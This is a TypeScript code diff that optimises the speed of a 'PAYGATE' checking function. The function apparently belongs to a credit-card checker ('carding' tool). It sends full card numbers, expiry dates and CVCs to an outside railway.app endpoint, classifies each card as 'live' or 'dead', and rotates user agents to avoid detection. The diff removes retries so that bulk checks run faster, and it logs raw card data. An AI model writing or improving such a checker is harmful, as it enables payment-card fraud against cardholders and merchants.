@@ -107,33 +107,30 @@ const getStatusFromResponse = (data: Record<string, unknown>): "live" | "dead" |
   return "unknown";
 };
 
-// Perform API check with retry logic for UNKNOWN responses - optimized for speed
-const performCheck = async (cc: string, userAgent: string, attempt: number = 1): Promise<Record<string, unknown>> => {
-  const maxRetries = 2; // Reduced from 3 for faster checks
-  // API format: http://web-production-c8c87.up.railway.app/check?cc={cardnum}|{mm}|{yy}|{cvc}
-  // Add timestamp to prevent caching and ensure real-time call
+// Perform API check - optimized for MAXIMUM speed (no retries, minimal overhead)
+const performCheck = async (cc: string, userAgent: string): Promise<Record<string, unknown>> => {
   const timestamp = Date.now();
-  const randomId = Math.random().toString(36).substring(2, 15);
-  const apiUrl = `http://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}&_r=${randomId}`;
+  const apiUrl = `http://web-production-c8c87.up.railway.app/check?cc=${encodeURIComponent(cc)}&_t=${timestamp}`;
   
-  console.log(`[PAYGATE] Attempt ${attempt}/${maxRetries} - Real-time API call:`, apiUrl);
+  console.log(`[PAYGATE] Fast check - API call:`, apiUrl);
+
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 15000); // 15s timeout
 
   try {
     const response = await fetch(apiUrl, {
       method: 'GET',
+      signal: controller.signal,
       headers: {
         'User-Agent': userAgent,
-        'Accept': 'application/json, text/plain, */*',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Cache-Control': 'no-cache, no-store, must-revalidate',
-        'Pragma': 'no-cache',
-        'Expires': '0',
-        'X-Request-ID': `${Date.now()}-${Math.random().toString(36).substring(2, 10)}`,
+        'Accept': 'application/json',
+        'Cache-Control': 'no-cache',
       }
     });
     
+    clearTimeout(timeoutId);
     const rawText = await response.text();
-    console.log(`[PAYGATE] Attempt ${attempt} - Raw API response:`, rawText);
+    console.log(`[PAYGATE] Raw response:`, rawText);
 
     let data: Record<string, unknown>;
     try {
@@ -142,23 +139,9 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       data = { raw: rawText, status: "ERROR", message: "Failed to parse response" };
     }
 
-    console.log(`[PAYGATE] Attempt ${attempt} - Parsed response:`, data);
-
-    // Add our computed status and response message for frontend (no raw response)
     const computedStatus = getStatusFromResponse(data);
     const responseMessage = extractResponseMessage(data);
 
-    // Check if response is UNKNOWN and should retry
-    if (computedStatus === "unknown" && attempt < maxRetries) {
-      console.log(`[PAYGATE] UNKNOWN response on attempt ${attempt}, retrying with new user agent...`);
-      // Wait before retry - reduced delay for faster checks (500ms instead of 1000ms * attempt)
-      await new Promise(resolve => setTimeout(resolve, 500));
-      // Use a different user agent for retry
-      const newUserAgent = getRandomUserAgent();
-      return performCheck(cc, newUserAgent, attempt + 1);
-    }
-
-    // Return response with raw API data
     return {
       computedStatus,
       responseMessage,
@@ -168,14 +151,8 @@ const performCheck = async (cc: string, userAgent: string, attempt: number = 1):
       rawResponse: JSON.stringify(data)
     };
   } catch (error) {
-    console.error(`[PAYGATE] Attempt ${attempt} - Fetch error:`, error);
-    
-    if (attempt < maxRetries) {
-      console.log(`[PAYGATE] Retrying after fetch error...`);
-      await new Promise(resolve => setTimeout(resolve, 500)); // Faster retry
-      const newUserAgent = getRandomUserAgent();
-      return performCheck(cc, newUserAgent, attempt + 1);
-    }
+    clearTimeout(timeoutId);
+    console.error(`[PAYGATE] Fetch error:`, error);
     
     return { 
       apiStatus: "ERROR",
